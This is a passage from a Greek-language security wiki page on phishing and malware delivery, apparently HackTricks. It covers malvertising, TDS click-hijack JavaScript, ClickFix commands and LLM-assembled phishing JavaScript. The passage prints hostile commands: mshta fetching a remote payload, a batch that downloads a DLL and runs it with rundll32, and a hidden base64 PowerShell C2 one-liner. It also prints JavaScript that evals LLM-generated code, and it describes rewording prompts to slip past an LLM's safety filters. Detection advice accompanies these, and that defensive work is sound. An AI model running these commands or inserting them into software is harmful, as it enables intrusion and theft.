Ομάδες που χρησιμοποιούν commodity malware αντισταθμίζουν το κόστος των επιχειρήσεων υψηλής στόχευσης με επιθέσεις μαζικής κλίμακας, μετατρέποντας τις **μηχανές αναζήτησης και τα δίκτυα διαφημίσεων σε κανάλι παράδοσης**.<sup>[[6]](#references)</sup>

1. Το **SEO poisoning / malvertising** προωθεί ένα ψεύτικο αποτέλεσμα, όπως το `chromium-update[.]site`, στην κορυφή των διαφημίσεων αναζήτησης.
2. Το θύμα κατεβάζει έναν μικρό **loader πρώτου σταδίου** (συχνά JS/HTA/ISO). Παραδείγματα που έχει εντοπίσει η Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Ο loader εξάγει cookies του browser και βάσεις δεδομένων διαπιστευτηρίων και, στη συνέχεια, κατεβάζει έναν **silent loader** που αποφασίζει – *σε πραγματικό χρόνο* – αν θα εγκαταστήσει:
   * RAT (π.χ. AsyncRAT, RustDesk)
   * ransomware / wiper
   * στοιχείο persistence (κλειδί Run του registry + προγραμματισμένη εργασία)

### Συμβουλές για ενίσχυση της ασφάλειας
* Αποκλείστε domains που καταχωρίστηκαν πρόσφατα και εφαρμόστε **Advanced DNS / URL Filtering** τόσο στις *διαφημίσεις αναζήτησης* όσο και στα e-mail.
* Περιορίστε την εγκατάσταση λογισμικού σε υπογεγραμμένα πακέτα MSI / Store και απαγορεύστε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω πολιτικής.
* Παρακολουθείτε για child processes των browsers που ανοίγουν installers:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Αναζητήστε LOLBins που καταχρώνται συχνά οι first-stage loaders (π.χ. `regsvr32`, `curl`, `mshta`).

### Υποκλοπή κλικ στο κουμπί λήψης με ανακατεύθυνση μέσω TDS
Ορισμένες ψεύτικες πύλες λογισμικού διατηρούν το ορατό `href` λήψης να δείχνει στην **πραγματική** διεύθυνση URL του GitHub/release, αλλά υποκλέπτουν την **πρώτη** αλληλεπίδραση του χρήστη μέσω JavaScript και κατευθύνουν το θύμα σε μια αλυσίδα **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Βασικά χαρακτηριστικά:
- Το hook συνήθως εκτελείται στη **φάση capture** (`true`) στο `document`, επομένως ενεργοποιείται πριν από τους handlers του site.
- Το Chrome συχνά χρησιμοποιεί `mousedown` αντί για `click`, ώστε να συνδέει το redirect με έγκυρη **χειρονομία χρήστη** και να παρακάμπτει ευκολότερα τους popup blockers.
- Ορισμένες παραλλαγές ανοίγουν εκ των προτέρων το `about:blank` ή προσομοιώνουν κλικ σε `<a target="_blank">` και ορίζουν το TDS URL μόνο αργότερα.
- Τα όρια στην πλευρά του browser αποθηκεύονται συχνά στο `localStorage`, οπότε το **πρώτο κλικ** μπορεί να οδηγήσει στο malware, ενώ οι ανανεώσεις/επαναλήψεις επιστρέφουν στον σύνδεσμο που φαίνεται αβλαβής.
- Το TDS μπορεί να εφαρμόζει ελέγχους βάσει referrer, domain εισόδου, GEO, browser/device fingerprint, VPN/datacenter, πλαισίου κλικ και μετρητών ανά session, κάνοντας τις επαναλήψεις από αναλυτές μη ντετερμινιστικές.

Ιδέες για αμυνόμενους:
- Συγκρίνετε το **εμφανιζόμενο** `href` με τον **πραγματικό** στόχο πλοήγησης που δημιουργείται τη στιγμή του κλικ.
- Αναζητήστε handlers `document.addEventListener(..., true)` που καλούν τόσο `preventDefault()` όσο και `stopImmediatePropagation()` γύρω από `window.open`, `about:blank` ή προσομοιωμένα κλικ σε anchor.
- Αντιμετωπίστε συστάδες πρόσφατα καταχωρισμένων domain λήψης λογισμικού που φορτώνουν όλα το ίδιο CloudFront/JS stage ως μοτίβο SEO poisoning/TDS υψηλής αξιοπιστίας.

### ClickFix από πλαστές σελίδες επαλήθευσης + λήψεις LOLBAS που μοιάζουν με αρχεία
Ορισμένοι κλάδοι του TDS καταλήγουν σε μια πλαστή σελίδα επαλήθευσης (τύπου Cloudflare/IUAM) που ζητά από το θύμα να εκτελέσει ένα έμπιστο δυαδικό αρχείο Windows, όπως:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Σημειώσεις:
- Το `mshta.exe` εκτελεί το **HTA/VBScript στην αρχή της απόκρισης**, ακόμα κι αν το URL προσποιείται ότι οδηγεί σε αρχείο `.7z`· τα δεδομένα αρχειοθέτησης που έχουν προστεθεί στο τέλος μπορεί να είναι καθαρό δόλωμα.
- Τα επόμενα στάδια συχνά συνεχίζουν να παραπλανούν ως προς τον τύπο αρχείου (`.rtf` για PowerShell, `.asar` για Python, ZIP με συμπληρωμένα δυαδικά αρχεία) και έπειτα περνούν σε **χειροκίνητη αντιστοίχιση PE / εκτέλεση στη μνήμη**.
- Αν αντιμετωπίζετε μία από αυτές τις αλυσίδες, διατηρήστε **το δίκτυο και τη μνήμη από την πρώτη επιτυχημένη εκτέλεση**: οι μεταγενέστερες επαναλήψεις μπορεί να δείχνουν μόνο μια ακίνδυνη διαδρομή installer/SFX ή να αποτυγχάνουν, επειδή η αποδέσμευση του payload/key είχε δεσμευτεί στην αρχική συνεδρία TDS.

### Τεχνικές παράδοσης DLL ClickFix (ψεύτικη ενημέρωση CERT)
* Δόλωμα: κλωνοποιημένη συμβουλευτική ανακοίνωση εθνικού CERT με κουμπί **Ενημέρωση** που εμφανίζει βήμα προς βήμα οδηγίες «επιδιόρθωσης». Οι στόχοι καλούνται να εκτελέσουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.<sup>[[12]](#references)</sup>
* Τυπική αλυσίδα batch που παρατηρήθηκε:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * Το `Invoke-WebRequest` αποθηκεύει το payload στο `%TEMP%`, μια σύντομη αναμονή αποκρύπτει το network jitter και έπειτα το `rundll32` καλεί το εξαγόμενο entrypoint (`notepad`).
* Το DLL στέλνει beacon με την ταυτότητα του host και ελέγχει το C2 κάθε λίγα λεπτά. Οι απομακρυσμένες εντολές φτάνουν ως **base64-encoded PowerShell**, το οποίο εκτελείται κρυφά και με παράκαμψη της πολιτικής:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάζει εργασίες χωρίς ενημέρωση του DLL) και αποκρύπτει τα παράθυρα της κονσόλας. Αναζητήστε διεργασίες PowerShell που είναι παιδιά του `rundll32.exe` και χρησιμοποιούν μαζί τα `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Οι defenders μπορούν να αναζητούν HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και διαστήματα polling 5 λεπτών μετά τη φόρτωση του DLL.

---

## Επιχειρήσεις phishing ενισχυμένες με AI
Οι attackers συνδυάζουν πλέον **LLM και voice-clone APIs** για πλήρως εξατομικευμένα δολώματα και αλληλεπίδραση σε πραγματικό χρόνο.

| Επίπεδο | Παράδειγμα χρήσης από threat actor |
|-------|-----------------------------|
|Αυτοματοποίηση|Δημιουργία και αποστολή >100 χιλ. email / SMS με τυχαιοποιημένη διατύπωση και tracking links.|
|Generative AI|Δημιουργία *μοναδικών* email που αναφέρονται σε δημόσιες συγχωνεύσεις και εξαγορές, εσωτερικά αστεία από τα social media· deep-fake φωνή CEO σε απάτη callback.|
|Agentic AI|Αυτόνομη καταχώριση domains, συλλογή open-source intel, σύνταξη επόμενων email όταν ένα θύμα κάνει click αλλά δεν υποβάλλει credentials.|

**Άμυνα:**  
• Προσθέστε **δυναμικά banners** που επισημαίνουν μηνύματα τα οποία αποστέλλονται από μη έμπιστους μηχανισμούς αυτοματοποίησης (μέσω ανωμαλιών ARC/DKIM).  
• Υιοθετήστε **φράσεις πρόκλησης voice-biometric** για τηλεφωνικά αιτήματα υψηλού κινδύνου.  
• Προσομοιώνετε συνεχώς δολώματα που δημιουργούνται από AI σε προγράμματα ευαισθητοποίησης – τα στατικά templates είναι παρωχημένα.

Δείτε επίσης – κατάχρηση agentic browsing για credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Δείτε επίσης – κατάχρηση τοπικών εργαλείων CLI και MCP από AI agent (για απογραφή secrets και ανίχνευση):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Συναρμολόγηση JavaScript για phishing κατά τον χρόνο εκτέλεσης με τη βοήθεια LLM (codegen στο πρόγραμμα περιήγησης)

Οι attackers μπορούν να διανέμουν HTML που φαίνεται ακίνδυνο και **να δημιουργούν τον stealer κατά τον χρόνο εκτέλεσης**, ζητώντας JavaScript από ένα **έμπιστο LLM API** και κατόπιν εκτελώντας το στο πρόγραμμα περιήγησης (π.χ., με `eval` ή δυναμικό `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** κωδικοποιήστε τα URL εξαγωγής δεδομένων/Base64 strings στο prompt· επαναδιατυπώστε το κείμενο για να παρακάμψετε τα safety filters και να μειώσετε τις παραισθήσεις.
2. **Κλήση API από την πλευρά του client:** κατά τη φόρτωση, η JS καλεί ένα δημόσιο LLM (Gemini/DeepSeek/etc.) ή ένα CDN proxy· στο στατικό HTML υπάρχει μόνο το prompt/η κλήση API.
3. **Συναρμολόγηση και εκτέλεση:** συνενώστε την απάντηση και εκτελέστε την (πολυμορφική ανά επίσκεψη):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** ο παραγόμενος κώδικας εξατομικεύει το δέλεαρ (π.χ. parsing token του LogoKit) και στέλνει τα διαπιστευτήρια στο endpoint που αποκρύπτεται στο prompt.

**Χαρακτηριστικά αποφυγής**
- Η κίνηση περνά από γνωστά domains LLM ή αξιόπιστους proxies CDN· μερικές φορές χρησιμοποιούνται WebSockets προς backend.
- Δεν υπάρχει στατικό payload· κακόβουλο JS υπάρχει μόνο μετά το render.
- Οι μη ντετερμινιστικές γενιές παράγουν **μοναδικούς** stealers για κάθε session.

**Ιδέες ανίχνευσης**
- Εκτέλεση sandbox με ενεργοποιημένο JS· επισήμανση των **runtime `eval`/δημιουργιών δυναμικών script με πηγή απαντήσεις LLM**.
- Αναζήτηση front-end POST προς API LLM, ακολουθούμενων αμέσως από `eval`/`Function` στο κείμενο που επιστράφηκε.
- Ειδοποίηση για μη εγκεκριμένα domains LLM στην κίνηση client και για επακόλουθα credential POST.

---

## MFA Fatigue / Push Bombing Variant – Αναγκαστική επαναφορά
Πέρα από το κλασικό push-bombing, οι χειριστές απλώς **εξαναγκάζουν νέα εγγραφή MFA** κατά τη διάρκεια της κλήσης στο help desk, ακυρώνοντας το υπάρχον token του χρήστη. Οποιοδήποτε επόμενο prompt σύνδεσης φαίνεται νόμιμο στο θύμα.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Παρακολουθείτε για συμβάντα AzureAD/AWS/Okta όπου **`deleteMFA` + `addMFA`** συμβαίνουν **μέσα σε λίγα λεπτά από την ίδια διεύθυνση IP**.



## Clipboard Hijacking / Pastejacking

Οι επιτιθέμενοι μπορούν να αντιγράψουν κρυφά κακόβουλες εντολές στο clipboard του θύματος από μια παραβιασμένη ή typosquatted ιστοσελίδα και έπειτα να ξεγελάσουν τον χρήστη ώστε να τις επικολλήσει μέσα στο **Win + R**, στο **Win + X** ή σε ένα παράθυρο τερματικού, εκτελώντας αυθαίρετο κώδικα χωρίς λήψη αρχείου ή συνημμένο.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Διανομή Κακόβουλων Εφαρμογών (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Υποκλοπή σύνδεσης συσκευής WhatsApp μέσω QR και social engineering
* Μια σελίδα-δόλωμα (π.χ., ένα ψεύτικο «κανάλι» υπουργείου/CERT) εμφανίζει ένα QR του WhatsApp Web/Desktop και καθοδηγεί το θύμα να το σαρώσει, προσθέτοντας κρυφά τον επιτιθέμενο ως **συνδεδεμένη συσκευή**.<sup>[[12]](#references)</sup>
* Ο επιτιθέμενος αποκτά αμέσως ορατότητα στις συνομιλίες και τις επαφές μέχρι να καταργηθεί η συνεδρία. Τα θύματα ενδέχεται αργότερα να δουν μια ειδοποίηση «συνδέθηκε νέα συσκευή»· οι αμυνόμενοι μπορούν να αναζητήσουν απρόσμενα συμβάντα σύνδεσης συσκευής λίγο μετά από επισκέψεις σε μη έμπιστες σελίδες QR.

### Phishing με περιορισμό σε κινητές συσκευές για αποφυγή crawlers/sandboxes
Οι χειριστές περιορίζουν όλο και συχνότερα τις ροές phishing με έναν απλό έλεγχο συσκευής, ώστε οι crawlers για desktop να μην καταλήγουν στις τελικές σελίδες. Ένα συνηθισμένο μοτίβο είναι ένα μικρό script που ελέγχει αν το DOM υποστηρίζει αφή και στέλνει το αποτέλεσμα σε ένα endpoint διακομιστή· οι συσκευές που δεν είναι κινητές λαμβάνουν HTTP 500 (ή κενή σελίδα), ενώ στους χρήστες κινητών εμφανίζεται ολόκληρη η ροή.<sup>[[7]](#references)</sup>

Ελάχιστο απόσπασμα client (τυπική λογική):

```html
<script src="/static/detect_device.js"></script>
```

Λογική του `detect_device.js` (απλοποιημένη):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Συμπεριφορά server που παρατηρείται συχνά:
- Ορίζει ένα session cookie κατά την πρώτη φόρτωση.
- Αποδέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) σε επόμενα GET όταν `is_mobile=false`· σερβίρει phishing μόνο όταν `true`.

Ευρετικές μέθοδοι αναζήτησης και ανίχνευσης:
- Ερώτημα urlscan: `filename:"detect_device.js" AND page.status:500`
- Τηλεμετρία ιστού: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για μη mobile συσκευές· οι νόμιμες διαδρομές θυμάτων από mobile συσκευές επιστρέφουν 200, ακολουθούμενες από HTML/JS.
- Αποκλείετε ή ελέγχετε εξονυχιστικά σελίδες που εμφανίζουν περιεχόμενο αποκλειστικά βάσει του `ontouchstart` ή παρόμοιων ελέγχων συσκευής.

Συμβουλές άμυνας:
- Εκτελείτε crawlers με mobile-like fingerprints και ενεργοποιημένο JS, ώστε να αποκαλύπτεται το περιεχόμενο που εμφανίζεται υπό προϋποθέσεις.
- Δημιουργείτε alert για ύποπτες αποκρίσεις 500 μετά από `POST /detect` σε πρόσφατα καταχωρισμένα domains.

## References

- [1] [Δημιουργία παραλλαγών domain που χρησιμοποιούνται σε phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Εντοπισμός phishing: Εργαλεία και τεχνικές (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Υποκλοπή διαπιστευτηρίων και παράκαμψη 2FA με noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Κλοπή sessions και παράκαμψη 2FA με EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Πώς να εγκαταστήσετε και να διαμορφώσετε το DKIM με Postfix στο Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Παγκόσμια έκθεση Unit 42 για την αντιμετώπιση περιστατικών του 2025 – Έκδοση για την κοινωνική μηχανική](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Αθόρυβο smishing – υποδομή phishing με πρόσβαση μόνο από mobile συσκευές και ευρετικές μέθοδοι (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Το επόμενο σύνορο των επιθέσεων συναρμολόγησης κατά το runtime: αξιοποίηση LLM για δημιουργία JavaScript phishing σε πραγματικό χρόνο](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Πλαστοπροσωπία, παραβίαση κλικ και TDS: μέσα σε ένα οικοσύστημα διανομής malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting στο Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Παραβίαση της κίνησης προς το windows.com της Microsoft μέσω αναστροφής bit (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Έρωτας; Στην πραγματικότητα: Ψεύτικη εφαρμογή γνωριμιών χρησιμοποιήθηκε ως δόλωμα σε στοχευμένη εκστρατεία spyware στο Πακιστάν](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC και δείγματα του ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
